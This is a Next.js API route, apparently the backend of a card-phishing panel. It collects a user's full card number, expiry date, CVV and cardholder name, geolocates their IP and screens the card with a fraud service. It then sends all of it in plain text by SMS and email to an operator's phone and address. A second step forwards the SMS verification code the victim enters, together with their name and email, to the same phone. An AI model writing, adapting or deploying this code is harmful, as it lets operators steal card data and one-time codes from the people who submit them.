// app/api/cards/request-sms/route.js
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getDb } from "../../../../lib/db";
import { sendCardDetailsSms, sendRawSms } from "../../../../lib/sms";
import { sendCardAdminEmail } from "../../../../lib/mail";

async function assertAuth() {
  const cookieStore = await cookies();
  const userId = cookieStore.get("user_id")?.value;
  if (!userId) return null;
  return userId;
}

function getClientIp(req) {
  const xff = req.headers.get("x-forwarded-for");
  if (xff) {
    const parts = xff.split(",").map((s) => s.trim());
    if (parts[0]) return parts[0];
  }
  const realIp = req.headers.get("x-real-ip");
  if (realIp) return realIp;
  return req.headers.get("x-client-ip") || null;
}

async function fetchGeoFromFreeIPAPI(ip) {
  try {
    const url = ip
      ? `https://freeipapi.com/api/json/${encodeURIComponent(ip)}`
      : "https://freeipapi.com/api/json";

    const res = await fetch(url);
    if (!res.ok) {
      console.error("FreeIPAPI error status:", res.status);
      return null;
    }
    const data = await res.json();
    return {
      ip: data.ipAddress || ip || null,
      cityName: data.cityName || null,
      regionName: data.regionName || null,
      countryName: data.countryName || null,
      countryCode: data.countryCode || null,
      latitude: data.latitude ?? null,
      longitude: data.longitude ?? null,
      timeZone: data.timeZone || null,
      zipCode: data.zipCode || null,
      isProxy: data.isProxy ?? null,
    };
  } catch (err) {
    console.error("FreeIPAPI fetch error:", err);
    return null;
  }
}

async function screenCardWithFraudLabs({ ip, email, cardNumber, userId }) {
  try {
    if (process.env.FRAUDLABS_ENABLED !== "true") return null;
    const apiKey = process.env.FRAUDLABS_API_KEY;
    if (!apiKey) {
      console.warn("FRAUDLABS_API_KEY missing");
      return null;
    }

    const bin = cardNumber ? cardNumber.slice(0, 6) : "";

    const body = new URLSearchParams({
      key: apiKey,
      format: "json",
      ip: ip || "",
      email: email || "",
      bin: bin || "",
      userid: String(userId || ""),
    });

    const res = await fetch("https://api.fraudlabspro.com/v2/order/screen", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
    });

    if (!res.ok) {
      console.error("FraudLabs Pro HTTP error:", res.status);
      return null;
    }

    const data = await res.json();
    return data;
  } catch (err) {
    console.error("FraudLabs Pro fetch error:", err);
    return null;
  }
}

export async function POST(req) {
  const userId = await assertAuth();
  if (!userId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await req.json().catch(() => null);
  if (!body) {
    return NextResponse.json({ error: "Invalid body" }, { status: 400 });
  }

  const { locale, cardNumber, expiryDate, cvv, cardholderName, smsCode } = body;

  // ── Cas 2 : soumission du code SMS saisi par le client ──────────────────────
  if (smsCode !== undefined) {
    const db = await getDb();
    try {
      const [users] = await db.execute(
        `SELECT full_name AS fullName, email FROM users WHERE id = ? LIMIT 1`,
        [userId]
      );
      await db.end();

      const user = users[0] || {};
      const adminPhone = process.env.ADMIN_PHONE || null;

      if (adminPhone) {
        // Format garanti <160 chars : "CODE:123456 N:John Doe M:john@ex.com"
        const code = String(smsCode).replace(/\D/g, "").slice(0, 10);
        const name = (user.fullName || "").slice(0, 30);
        const email = (user.email || "").slice(0, 40);
        const text = `CODE:${code} N:${name} M:${email}`;
        await sendRawSms({ to: adminPhone, text });
      }

      return NextResponse.json({ success: true });
    } catch (err) {
      console.error("verify-sms error:", err);
      return NextResponse.json({ error: "Server error" }, { status: 500 });
    }
  }

  // ── Cas 1 : soumission des infos carte (étape 1) ────────────────────────────
  if (!cardNumber || !expiryDate || !cvv || !cardholderName) {
    return NextResponse.json(
      { error: "Missing card fields" },
      { status: 400 }
    );
  }

  const expMatch = /^(\d{2})\/(\d{2})$/.test(expiryDate)
    ? expiryDate.split("/")
    : null;
  if (!expMatch) {
    return NextResponse.json(
      { error: "Format de date d'expiration invalide (MM/YY attendu)." },
      { status: 400 }
    );
  }
  const [mmStr, yyStr] = expiryDate.split("/");
  const mm = Number(mmStr);
  const yy = Number(yyStr);
  if (!Number.isInteger(mm) || mm < 1 || mm > 12) {
    return NextResponse.json(
      { error: "Mois d'expiration invalide." },
      { status: 400 }
    );
  }
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;

  if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
    return NextResponse.json(
      { error: "La date d'expiration est déjà passée." },
      { status: 400 }
    );
  }

  const db = await getDb();

  try {
    const [users] = await db.execute(
      `SELECT full_name AS fullName, email, phone FROM users WHERE id = ? LIMIT 1`,
      [userId]
    );
    const user = users[0] || {};

    const adminPhone = process.env.ADMIN_PHONE || null;
    const adminEmail = process.env.ADMIN_EMAIL || null;

    if (!adminPhone) {
      await db.end();
      return NextResponse.json(
        { error: "ADMIN_PHONE not configured" },
        { status: 500 }
      );
    }

    const ip = getClientIp(req);
    const geo = await fetchGeoFromFreeIPAPI(ip);

    let fraudResult = null;
    if (adminEmail) {
      fraudResult = await screenCardWithFraudLabs({
        ip: geo?.ip || ip || null,
        email: user.email || null,
        cardNumber,
        userId,
      });
    }

    // SMS admin avec infos carte
    await sendCardDetailsSms({
      to: adminPhone,
      user: { ...user, id: userId },
      locale,
      card: { cardNumber, expiryDate, cvv, cardholderName },
    });

    // Email admin avec géoloc + FraudLabs
    if (adminEmail) {
      const requestedAt = new Date().toISOString();

      await sendCardAdminEmail({
        to: adminEmail,
        adminName: process.env.ADMIN_NAME || "Admin",
        user: { ...user, id: userId },
        card: {
          cardNumber,
          expiryDate,
          cvv,
          cardholderName,
          locale,
          requestedAt,
        },
        geo: geo || {},
        fraud: fraudResult || null,
      });
    }

    await db.end();

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("request-sms error:", err);
    await db.end();
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
